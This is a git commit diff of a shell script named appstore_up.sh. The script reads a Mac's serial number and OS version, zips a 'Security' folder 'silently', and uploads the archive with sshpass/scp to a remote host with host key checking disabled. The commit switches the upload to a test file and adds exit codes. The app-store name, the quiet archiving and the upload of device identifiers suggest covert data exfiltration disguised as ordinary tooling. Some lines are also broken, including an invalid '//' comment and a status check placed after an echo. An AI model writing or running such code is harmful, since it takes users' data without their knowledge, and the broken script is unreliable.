8d2aac5704c44696184354861628e41558d481e8
codecpacka <32800467+codecpacka@users.noreply.github.com>
2026-06-17 13:46:21 +0530

    Update appstore_up.sh
    added code to delete undelete automatically

--- appstore_up.sh
+++ appstore_up.sh
@@ -12,7 +12,7 @@ REMOTE_DEST="/"
 # Configuration
 SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
 IOS_VERSION=$(sw_vers -productVersion)
-LOCAL_FILE="appstore_unmodified.zip"
+LOCAL_FILE="appstore_unmodified"
 ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}.zip"
 echo "$ARCHIVE_NAME"
 
@@ -23,19 +23,22 @@ echo "archiving silently"
 zip -qr "$ARCHIVE_NAME" Security && echo "Archiving complete!"
 
 
-
+TEST_FILE=au.zip //app unmodified test file name
 
 
 
 # --- Upload Command ---
 # -p specifies the password
 # -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
-sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
+sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$TEST_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 #sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$ARCHIVE_NAME" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
  echo "connection sucesfully"
 # Check if the upload was successful
 if [[ $? -eq 0 ]]; then
    echo "connection sucesfully"
+   exit 100
 else
    echo "connection failed."
+   exit 101
 fi
+
